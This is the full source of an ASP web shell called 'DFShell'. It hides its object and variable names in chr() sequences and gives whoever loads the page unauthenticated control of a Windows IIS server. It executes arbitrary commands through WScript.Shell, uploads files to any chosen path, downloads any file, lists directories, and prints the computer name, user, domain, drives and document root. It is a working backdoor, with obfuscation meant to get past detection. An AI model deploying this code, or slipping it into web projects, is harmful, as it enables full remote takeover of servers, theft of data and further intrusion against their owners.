
<%
Dim Scd : Scd = (chr(83)&chr(99)&chr(114)&chr(105)&chr(112)&chr(116)&chr(105)&chr(110)&chr(103)&chr(46)&chr(68)&chr(105)&chr(99)&chr(116)&chr(105)&chr(111)&chr(110)&chr(97)&chr(114)&chr(121))
Dim dfsact : dfsact = (chr(100)&chr(102)&chr(115)&chr(97)&chr(99)&chr(116)&chr(105)&chr(111)&chr(110))
Dim dfsupl : dfsupl = (chr(100)&chr(102)&chr(115)&chr(117)&chr(112)&chr(108))
Dim Scn : Scn = (chr(87)&chr(83)&chr(67)&chr(82)&chr(73)&chr(80)&chr(84)&chr(46)&chr(78)&chr(69)&chr(84)&chr(87)&chr(79)&chr(82)&chr(75))
Dim Sfo : Sfo = (chr(83)&chr(99)&chr(114)&chr(105)&chr(112)&chr(116)&chr(105)&chr(110)&chr(103)&chr(46)&chr(70)&chr(105)&chr(108)&chr(101)&chr(83)&chr(121)&chr(115)&chr(116)&chr(101)&chr(109)&chr(79)&chr(98)&chr(106)&chr(101)&chr(99)&chr(116))
Dim ScrRep : ScrRep = (chr(119)&chr(105)&chr(110)&chr(100)&chr(111)&chr(119)&chr(46)&chr(108)&chr(111)&chr(99)&chr(97)&chr(116)&chr(105)&chr(111)&chr(110)&chr(46)&chr(114)&chr(101)&chr(112)&chr(108)&chr(97)&chr(99)&chr(101)&chr(40)&chr(108)&chr(111)&chr(99)&chr(97)&chr(116)&chr(105)&chr(111)&chr(110)&chr(46)&chr(112)&chr(97)&chr(116)&chr(104)&chr(110)&chr(97)&chr(109)&chr(101)&chr(41)&chr(59))
Dim mShl : mShl = (chr(87)&chr(83)&chr(99)&chr(114)&chr(105)&chr(112)&chr(116)&chr(46)&chr(83)&chr(104)&chr(101)&chr(108)&chr(108))
Dim srvn : srvn = (chr(115)&chr(101)&chr(114)&chr(118)&chr(101)&chr(114)&chr(95)&chr(110)&chr(97)&chr(109)&chr(101))
Dim srvp : srvp = (chr(115)&chr(101)&chr(114)&chr(118)&chr(101)&chr(114)&chr(95)&chr(112)&chr(111)&chr(114)&chr(116))
Dim srvs : srvs = (chr(115)&chr(101)&chr(114)&chr(118)&chr(101)&chr(114)&chr(95)&chr(115)&chr(111)&chr(102)&chr(116)&chr(119)&chr(97)&chr(114)&chr(101))
Dim laddr : laddr = (chr(76)&chr(79)&chr(67)&chr(65)&chr(76)&chr(95)&chr(65)&chr(68)&chr(68)&chr(82))
Dim appth : appth = (chr(65)&chr(80)&chr(80)&chr(76)&chr(95)&chr(80)&chr(72)&chr(89)&chr(83)&chr(73)&chr(67)&chr(65)&chr(76)&chr(95)&chr(80)&chr(65)&chr(84)&chr(72))
Dim ptif : ptif = (chr(80)&chr(65)&chr(84)&chr(72)&chr(95)&chr(73)&chr(78)&chr(70)&chr(79))
Dim scnm : scnm = (chr(83)&chr(67)&chr(82)&chr(73)&chr(80)&chr(84)&chr(95)&chr(78)&chr(65)&chr(77)&chr(69))
Dim rmaddr : rmaddr = (chr(82)&chr(69)&chr(77)&chr(79)&chr(84)&chr(69)&chr(95)&chr(65)&chr(68)&chr(68)&chr(82))

Class DFShell
    Private cryptkey,g_KeyLen,fileSaveState

	Private Sub Class_Initialize()
		fileSaveState 	= False
		g_KeyLen 		= 512
		cryptkey 		= "y$_=#%$Af{a}fEJHWF&$&rthyH#SDfSHG#YLO:{\/@ASDBMI~d<>?"

	End Sub

	Private Function URLDecode4Encrypt(sConvert)
		Dim aSplit
		Dim sOutput
		Dim I
		If IsNull(sConvert) Then
			URLDecode4Encrypt = ""
			Exit Function
		End If

		sOutput=sConvert
		aSplit = Split(sOutput, "%")
		If IsArray(aSplit) Then
			sOutput = aSplit(0)
			For I = 0 to UBound(aSplit) - 1
				sOutput = sOutput &  Chr("&H" & Left(aSplit(i + 1), 2)) & Right(aSplit(i + 1), Len(aSplit(i + 1)) - 2)
			Next
		End If
		URLDecode4Encrypt = sOutput
	End Function

    Public function DFSDownload(strPath,strFile)

        Response.Buffer = False
        Set objStream = Server.CreateObject("ADODB.Stream")
        objStream.Type = 1
        objStream.Open
        objStream.LoadFromFile(strPath & strFile)
        Response.ContentType = "application/octet-stream"
        Response.Addheader "Content-Disposition", "attachment; filename=" & strFile
        Response.BinaryWrite objStream.Read
        objStream.Close
        Set objStream = Nothing

    End function


	Public function Encrypt(inputstr)
		Dim i,x
		outputstr=""
		cc=0
		for i=1 to len(inputstr)
			x=asc(mid(inputstr,i,1))
			x=x-48
			if x<0 then x=x+255
			x=x+asc(mid(cryptkey,cc+1,1))
			if x>255 then x=x-255
			outputstr=outputstr&chr(x)
			cc=(cc+1) mod len(cryptkey)
		next
		Encrypt = server.urlencode(replace(outputstr,"%","%25"))
	End function

	Public function Decrypt(byval inputstr)
		Dim i,x
		inputstr=URLDecode4Encrypt(inputstr)
		outputstr=""
		cc=0
		for i=1 to len(inputstr)
			x=asc(mid(inputstr,i,1))
			x=x-asc(mid(cryptkey,cc+1,1))
			if x<0 then x=x+255
			x=x+48
			if x>255 then x=x-255
			outputstr=outputstr&chr(x)
			cc=(cc+1) mod len(cryptkey)
		next
		Decrypt = outputstr
	End function

    Public function ereg_replace(strOriginalString, strPattern, strReplacement)
        dim objRegExp : set objRegExp = new RegExp
        objRegExp.Pattern = strPattern
        objRegExp.IgnoreCase = True
        objRegExp.Global = True
        ereg_replace = objRegExp.replace(strOriginalString, strReplacement)
        set objRegExp = nothing
    End function

    Public Function BuildUpload(RequestBin)
        PosBeg = 1
        PosEnd = InstrB(PosBeg,RequestBin,getByteString(chr(13)))
        boundary = MidB(RequestBin,PosBeg,PosEnd-PosBeg)
        boundaryPos = InstrB(1,RequestBin,boundary)
        Do until (boundaryPos=InstrB(RequestBin,boundary & getByteString("--")))
            Dim UploadControl
            Set UploadControl = CreateObject(Scd)
            Pos = InstrB(BoundaryPos,RequestBin,getByteString("Content-Disposition"))
            Pos = InstrB(Pos,RequestBin,getByteString("name="))
            PosBeg = Pos+6
            PosEnd = InstrB(PosBeg,RequestBin,getByteString(chr(34)))
            Name = getString(MidB(RequestBin,PosBeg,PosEnd-PosBeg))
            PosFile = InstrB(BoundaryPos,RequestBin,getByteString("filename="))
            PosBound = InstrB(PosEnd,RequestBin,boundary)
            If PosFile<>0 AND (PosFile<PosBound) Then
                PosBeg = PosFile + 10
                PosEnd = InstrB(PosBeg,RequestBin,getByteString(chr(34)))
                FileName = getString(MidB(RequestBin,PosBeg,PosEnd-PosBeg))
                UploadControl.Add "FileName", FileName
                Pos = InstrB(PosEnd,RequestBin,getByteString("Content-Type:"))
                PosBeg = Pos+14
                PosEnd = InstrB(PosBeg,RequestBin,getByteString(chr(13)))
                ContentType = getString(MidB(RequestBin,PosBeg,PosEnd-PosBeg))
                UploadControl.Add "ContentType",ContentType
                PosBeg = PosEnd+4
                PosEnd = InstrB(PosBeg,RequestBin,boundary)-2
                Value = MidB(RequestBin,PosBeg,PosEnd-PosBeg)
                Else
                Pos = InstrB(Pos,RequestBin,getByteString(chr(13)))
                PosBeg = Pos+4
                PosEnd = InstrB(PosBeg,RequestBin,boundary)-2
                Value = getString(MidB(RequestBin,PosBeg,PosEnd-PosBeg))
            End If
            UploadControl.Add "Value" , Value
            UploadRequest.Add name, UploadControl
            BoundaryPos=InstrB(BoundaryPos+LenB(boundary),RequestBin,boundary)
        Loop
        BuildUpload = true
    End Function

    Private Function getByteString(StringStr)
        For i = 1 to Len(StringStr)
            char = Mid(StringStr,i,1)
            getByteString = getByteString & chrB(AscB(char))
        Next
    End Function

    Private Function getString(StringBin)
        getString =""
        For intCount = 1 to LenB(StringBin)
            getString = getString & chr(AscB(MidB(StringBin,intCount,1)))
        Next
    End Function

    Public Function system(theCommand)
        Dim objShell, objCmdExec
        Set objShell = CreateObject(mShl)
        Set objCmdExec = objshell.exec(thecommand)
        system = objCmdExec.StdOut.ReadAll
    End Function

End Class
%>
<%
Dim shell,dftm,dpth,dpth1
Set DFSnet = CreateObject(Scn)
Set DFSfo = CreateObject(Sfo)
Set shell = new DFShell

dftm = request.querystring(dfsact)
dfsf = request.querystring("dfsf")
dfsp = request.querystring("dfsp")

dpth1 = Server.MapPath(Request.ServerVariables(scnm))
pos = Instr(dpth1,"\")
pos2 = 1
While pos2 <> 0
	If Instr(pos + 1,dpth1,"\") <> 0 Then
		pos = Instr(pos + 1,dpth1,"\")
	Else
		pos2 = 0
	End If
Wend

    If request("dfsaction") = "download" Then
        call shell.DFSDownload(dfsf,dfsp)
    Else
%>

<!DOCTYPE html>
<html>
<body>
<%


Response.Buffer = true

response.write("<br>Server : "&Request.ServerVariables(srvn)&" | Port : "&Request.ServerVariables(srvp)&" | Server Address : "&Request.ServerVariables(laddr))
response.write("<br>CompName : " & DFSnet.ComputerName & " | User : " & DFSnet.UserName & " | Domain : "&DFSnet.UserDomain)
response.write("<br>Server Software : "&Request.ServerVariables(srvs)&" | Your IP : "&Request.ServerVariables(rmaddr))
response.write("<br>Current Access: "&dpth1&" | Current Folder: "&Left(dpth1,pos))
response.write("<br>Document Root : "&Request.ServerVariables(appth))
response.write(" | Disk Available: ")

	for each drive_ in DFSfo.Drives
		if drive_.Drivetype=2 then Response.write("Drive " & drive_.DriveLetter & ":,")
		if drive_.Drivetype=3 then Response.write("RDrive " & drive_.DriveLetter & ":,")
		if drive_.Drivetype=4 then Response.write("CDRom[" & drive_.DriveLetter & ":],")
	next

if dftm <> "" Then
    Select Case dftm
        Case "cmd"
%>
<form action="" method="GET">
<input TYPE="hidden" name="dfsaction" value="cmd">
Command : <input TYPE="text" name="exec" placeholder="whoami"><br>
<button>Execute</button>
</form>
<%
            if request("exec") <> "" Then
                Response.write("<pre>")
                Response.write(shell.system("cmd /c"&request("exec")))
                Response.write("</pre>")
            End if
        Case "view"
        Case "upload"
            if request("add") = "1" Then
                Response.Clear
                byteCount = Request.TotalBytes
                RequestBin = Request.BinaryRead(byteCount)
                Set UploadRequest = CreateObject(Scd)
                If shell.BuildUpload(RequestBin) Then
                    If UploadRequest.Item(dfsupl).Item("Value") <> "" Then
                        contentType = UploadRequest.Item(dfsupl).Item("ContentType")
                        filepathname = UploadRequest.Item(dfsupl).Item("FileName")
                        filename = Right(filepathname,Len(filepathname)-InstrRev(filepathname,"\"))
                        value = UploadRequest.Item(dfsupl).Item("Value")
                        path = UploadRequest.Item("path").Item("Value")
                        filename = path & filename
                        Set MyFileObject = CreateObject(Sfo)
                        Set objFile = MyFileObject.CreateTextFile(filename)
                        For i = 1 to LenB(value)
                            objFile.Write chr(AscB(MidB(value,i,1)))
                        Next
                        objFile.Close
                        Set objFile = Nothing
                        Set MyFileObject = Nothing
                        If filename <> "" and DFSfo.FileExists(filename) Then
                            response.write("<script>alert('File uploaded!');"&ScrRep&"</script>")
                        End If
                    End If
                End If
                Set UploadRequest = Nothing
            Else
                %>
<form action="?dfsaction=upload&add=1" method="POST" enctype="multipart/form-data">
    
Upload PATH: <input TYPE="text" Name="path" value="<%=Left(dpth1,pos) %>"><br>
<input TYPE="file" NAME="dfsupl">
<input TYPE="submit" name="upact" Value="Upload">
</form>
                <%
            End If
    End Select

    ElseIf dfsf <> "" Then
        Set dfsfx = DFSfo.GetFolder(dfsf)
        For each itm in dfsfx.SubFolders
            response.write(itm.Name&"<br>")
        Next
        For each itm in dfsfx.Files
            response.write(itm.Name&"<br>")
        Next
    ElseIf dfsp <> "" Then
        response.write("DFS")
    Else
        response.write("<br>")
        Set DFSCF = DFSfo.GetFolder(Left(dpth1,pos))
        For each itm in DFSCF.SubFolders
            response.write(itm.Name&"<br>")
        Next
        For each itm in DFSCF.Files
            response.write(itm.Name&"<br>")
        Next
End If
%>

<pre>
<%
    Dim Xt1Y0p,X5pl1
    Xt1Y0p = "R,E,M,O,T,E,_,A,D,D,R"
    X5pl1 = split(Xt1Y0p,",")
    For i=0 to uBound(X5pl1)
        For j=0 to 255
            If chr(j) = X5pl1(i) Then
                response.write("chr("&j&")&")
            End if
        Next
    Next
    'Dim xxx : xxx = shell.Encrypt("foldah")
    'response.write(shell.Decrypt(xxx))
%>
    </body>
</html>
<%
End if
%>
